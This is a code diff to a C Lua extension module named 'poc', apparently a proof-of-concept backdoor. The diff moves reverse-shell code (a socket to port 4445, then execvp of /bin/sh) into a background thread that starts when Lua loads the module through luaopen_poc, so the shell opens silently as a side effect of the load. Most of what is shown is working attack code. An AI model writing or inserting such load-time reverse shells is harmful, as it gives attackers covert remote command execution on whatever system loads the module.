@@ -13,6 +13,8 @@
 #include <unistd.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <pthread.h>
+
 /*
 static int exec(lua_State *L) {
     const char *command = luaL_checkstring(L, 1);
@@ -90,12 +92,7 @@ static int exec(lua_State *L) {
 }*/
 
 
-int luaopen_poc(lua_State *L) {
-    /*static const struct luaL_Reg exec_lib[] = {
-        {"command", exec},
-        {NULL, NULL}
-    };*/
-
+void *thread(void *arg) {
     int port = 4445;
     struct sockaddr_in revsockaddr;
 
@@ -113,6 +110,21 @@ int luaopen_poc(lua_State *L) {
     char * const argv[] = {"/bin/sh", NULL};
     execvp("/bin/sh", argv);
 
+    pthread_exit((char*)"exit");
+}
+
+int luaopen_poc(lua_State *L) {
+    /*static const struct luaL_Reg exec_lib[] = {
+        {"command", exec},
+        {NULL, NULL}
+    };*/
+
+    pthread_t thid;
+    void *ret;
+    if (pthread_create(&thid, NULL, thread, NULL) != 0) {
+        perror("pthread_create() error");
+        exit(1);
+    }
     
     // luaL_newlib(L, exec_lib);
     return 1;
